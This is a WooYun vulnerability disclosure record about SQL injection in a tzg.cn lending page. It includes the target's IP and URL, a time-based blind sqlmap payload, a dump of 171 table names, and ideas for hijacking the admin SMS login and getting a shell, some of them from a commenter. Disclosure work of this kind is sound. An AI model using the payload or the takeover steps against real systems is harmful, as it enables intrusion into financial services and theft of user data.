{"id": 75135, "wybug_id": "wooyun-2016-0168437", "wybug_title": "金融安全之铜掌柜root权限SQL注入漏洞涉及171个表", "wybug_corp": "tzg.cn", "wybug_author": "路人甲", "wybug_date": "2016-01-08 15:49", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 注入啊注入，看前人提交注入说未复现，不知道厂商是不会还是怎么的，如果还不能复现可以私信我 详细说明：  http://122.224.156.194:9090/daikuantouzi?rateEnd=10&rateBegin=0&istate=10&pageIndex=11istate参数存在注入\n\nroot权限，泄漏171个表。用户数据达数十万\nsqlmap resumed the following injection point(s) from stored session:---Parameter: istate (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: rateEnd=10&rateBegin=0&istate=10) AND (SELECT * FROM (SELECT(SLEEP(5)))CZjr) AND (9985=9985&pageIndex=11---back-end DBMS: MySQL 5.0.12Database: tzg[171 tables]+---------------------------------+| batch_job_execution             || batch_job_execution_context     || batch_job_execution_params      || batch_job_execution_seq         || batch_job_instance              || batch_job_params                || batch_job_seq                   || batch_step_execution            || batch_step_execution_context    || batch_step_execution_seq        || tbaccounttoken                  || tbactive                        || tbactivechance                  || tbactivepraise                  || tbactivereward                  || tbactiverewardrecord            || tbactiverewardsend              || tbactivesignrecord              || tbadvancecompany                || tbadvancedfinancialaudit        || tbadvancefinancialauditflow     || tbapprovalflow                  || tbapprovalrating                || tbappversion                    || tbappwelcomeimage               || tbareainfo                      || tbattachcataloglist             || tbauditinformation              || tbautoinvest                    || tbawardsaccount                 || tbawardsapply                   || tbawardsapplyflow               || tbawardscdkey                   || tbawardsdisplay                 || tbawardsgrant                   || tbawardsrule                    || tbawardsused                    || tbbankcashmanage                || tbbankinfo                      || tbbankpaymanage                 || tbbindbankcard                  || tbborroweraccount               || tbborrowrecord                  || tbcash                          || tbcerifycataloglist             || tbcerifycatalogtype             || tbchannel                       || tbcommunity                     || tbcompanyfinancialaudit         || tbcompanyfinancialauditflow     || tbconsoleloginaccount           || tbcontracttemplate              || tbcreditaccount                 || tbcreditconsumerecord           || tbcreditinvestrecord            || tbcreditrefundrecord            || tbcreditrepayrecord             || tbcustomservicetrack            || tbdayinvest                     || tbemailmanage                   || tbemailrecord                   || tbemailsend                     || tbexperiencesubject             || tbexperiencesubjectinvestrecord || tbexperiencesubjectrepayrecord  || tbfbaba                         || tbfinancialauditflow            || tbfinancialcash                 || tbfinancialcashfailure          || tbfinancialmakeup               || tbfinancialrecord               || tbfinancialrepay                || tbfinancing                     || tbfixedbaodialyoverview         || tbfixedbaoinvestrecord          || tbfixedbaoproject               || tbfixedbaoprojectdetail         || tbfixedbaorepayrecord           || tbfixedbaosubject               || tbfocus                         || tbfriendlylink                  || tbguarantee                     || tbguaranteeaccount              || tbhelpcategy                    || tbhelpdetail                    || tbinstitution                   || tbinvestcompany                 || tbinvesteraccount               || tbinvestrecord                  || tbinvestrepayrecord             || tbllpaycard                     || tbllpaycash                     || tbllpayproject                  || tbllpayprojecttransfer          || tbllpayregister                 || tbloginaccount                  || tbloginaccountaudit             || tbloginaccountauditflow         || tbloginchannelactivityreward    || tbloginchannelmiactive          || tbloginchannelotheractive       || tbmediareports                  || tbmessage                       || tbmessagemanage                 || tbmessagesubscriptions          || tbmessagesubscriptionshistory   || tbmsmsrecord                    || tbmsmssend                      || tbnews                          || tbnotice                        || tbpersonalrole                  || tbplatformaccount               || tbproject                       || tbprojectattach                 || tbprojectcataloglist            || tbprojectcategy                 || tbprojectsafeguard              || tbprojectsuggestions            || tbpromotechannel                || tbpushrecord                    || tbrecharge                      || tbrecommendrecords              || tbredapply                      || tbredauditflow                  || tbredmakeup                     || tbredrecord                     || tbredrule                       || tbregistemessage                || tbrepayrecord                   || tbreport001                     || tbreport002                     || tbreport003                     || tbreport004                     || tbreport005                     || tbreport006                     || tbreport007                     || tbreport008                     || tbreport009                     || tbreport010                     || tbreport011                     || tbreport012                     || tbreport013                     || tbreport014                     || tbreport015                     || tbreport016                     || tbreport018                     || tbreport019                     || tbreport020                     || tbreport900                     || tbreportaward                   || tbreportborroweraccount         || tbreportdis                     || tbreportinvestaccount           || tbreportplatformaccount         || tbreportreserveaccount          || tbreserveaccount                || tbresource                      || tbriskenterprise                || tbriskpersonal                  || tbroleinfo                      || tbroleresource                  || tbsafeguardmeasures             || tbsmsmanage                     || tbsmsrecord                     || tbsmssend                       || tbsmstemplate                   || tbsmswhitelist                  || tbsubject                       || tbsubjectplan                   || tbsystemparam                   || tbuploadfile                    |+---------------------------------+\n还有后台http://122.224.156.194:82/还得需要手机验证码，利用注入是可以改掉手机号接验证码进后台的，我就布试了   漏洞证明：  http://122.224.156.194:9090/daikuantouzi?rateEnd=10&rateBegin=0&istate=10&pageIndex=11istate参数存在注入\n\nroot权限，泄漏171个表。用户数据达数十万\nsqlmap resumed the following injection point(s) from stored session:---Parameter: istate (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: rateEnd=10&rateBegin=0&istate=10) AND (SELECT * FROM (SELECT(SLEEP(5)))CZjr) AND (9985=9985&pageIndex=11---back-end DBMS: MySQL 5.0.12Database: tzg[171 tables]+---------------------------------+| batch_job_execution             || batch_job_execution_context     || batch_job_execution_params      || batch_job_execution_seq         || batch_job_instance              || batch_job_params                || batch_job_seq                   || batch_step_execution            || batch_step_execution_context    || batch_step_execution_seq        || tbaccounttoken                  || tbactive                        || tbactivechance                  || tbactivepraise                  || tbactivereward                  || tbactiverewardrecord            || tbactiverewardsend              || tbactivesignrecord              || tbadvancecompany                || tbadvancedfinancialaudit        || tbadvancefinancialauditflow     || tbapprovalflow                  || tbapprovalrating                || tbappversion                    || tbappwelcomeimage               || tbareainfo                      || tbattachcataloglist             || tbauditinformation              || tbautoinvest                    || tbawardsaccount                 || tbawardsapply                   || tbawardsapplyflow               || tbawardscdkey                   || tbawardsdisplay                 || tbawardsgrant                   || tbawardsrule                    || tbawardsused                    || tbbankcashmanage                || tbbankinfo                      || tbbankpaymanage                 || tbbindbankcard                  || tbborroweraccount               || tbborrowrecord                  || tbcash                          || tbcerifycataloglist             || tbcerifycatalogtype             || tbchannel                       || tbcommunity                     || tbcompanyfinancialaudit         || tbcompanyfinancialauditflow     || tbconsoleloginaccount           || tbcontracttemplate              || tbcreditaccount                 || tbcreditconsumerecord           || tbcreditinvestrecord            || tbcreditrefundrecord            || tbcreditrepayrecord             || tbcustomservicetrack            || tbdayinvest                     || tbemailmanage                   || tbemailrecord                   || tbemailsend                     || tbexperiencesubject             || tbexperiencesubjectinvestrecord || tbexperiencesubjectrepayrecord  || tbfbaba                         || tbfinancialauditflow            || tbfinancialcash                 || tbfinancialcashfailure          || tbfinancialmakeup               || tbfinancialrecord               || tbfinancialrepay                || tbfinancing                     || tbfixedbaodialyoverview         || tbfixedbaoinvestrecord          || tbfixedbaoproject               || tbfixedbaoprojectdetail         || tbfixedbaorepayrecord           || tbfixedbaosubject               || tbfocus                         || tbfriendlylink                  || tbguarantee                     || tbguaranteeaccount              || tbhelpcategy                    || tbhelpdetail                    || tbinstitution                   || tbinvestcompany                 || tbinvesteraccount               || tbinvestrecord                  || tbinvestrepayrecord             || tbllpaycard                     || tbllpaycash                     || tbllpayproject                  || tbllpayprojecttransfer          || tbllpayregister                 || tbloginaccount                  || tbloginaccountaudit             || tbloginaccountauditflow         || tbloginchannelactivityreward    || tbloginchannelmiactive          || tbloginchannelotheractive       || tbmediareports                  || tbmessage                       || tbmessagemanage                 || tbmessagesubscriptions          || tbmessagesubscriptionshistory   || tbmsmsrecord                    || tbmsmssend                      || tbnews                          || tbnotice                        || tbpersonalrole                  || tbplatformaccount               || tbproject                       || tbprojectattach                 || tbprojectcataloglist            || tbprojectcategy                 || tbprojectsafeguard              || tbprojectsuggestions            || tbpromotechannel                || tbpushrecord                    || tbrecharge                      || tbrecommendrecords              || tbredapply                      || tbredauditflow                  || tbredmakeup                     || tbredrecord                     || tbredrule                       || tbregistemessage                || tbrepayrecord                   || tbreport001                     || tbreport002                     || tbreport003                     || tbreport004                     || tbreport005                     || tbreport006                     || tbreport007                     || tbreport008                     || tbreport009                     || tbreport010                     || tbreport011                     || tbreport012                     || tbreport013                     || tbreport014                     || tbreport015                     || tbreport016                     || tbreport018                     || tbreport019                     || tbreport020                     || tbreport900                     || tbreportaward                   || tbreportborroweraccount         || tbreportdis                     || tbreportinvestaccount           || tbreportplatformaccount         || tbreportreserveaccount          || tbreserveaccount                || tbresource                      || tbriskenterprise                || tbriskpersonal                  || tbroleinfo                      || tbroleresource                  || tbsafeguardmeasures             || tbsmsmanage                     || tbsmsrecord                     || tbsmssend                       || tbsmstemplate                   || tbsmswhitelist                  || tbsubject                       || tbsubjectplan                   || tbsystemparam                   || tbuploadfile                    |+---------------------------------+\n还有后台http://122.224.156.194:82/还得需要手机验证码，利用注入是可以改掉手机号接验证码进后台的，我就布试了   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-08 18:19 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-08 16:30 |    \t\t铜米(乌云厂商)\t\t \n  http://122.224.156.194:9090 是什么应用?    \n     2016-01-08 16:50 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:245 漏洞数:55        )\t\t \n  @铜米 这是你们的网站啊？？    \n     2016-01-08 17:29 |    \t\t铜米(乌云厂商)\t\t \n  未发布的一款产品,数据都是测试数据,这个不在测试范围呀!不管怎样还是感谢.    \n     2016-01-10 07:24 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:245 漏洞数:55        )\t\t \n  @铜米 看着像主站的测试站，完全有可能进后台，拿shel，下到主站源码    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}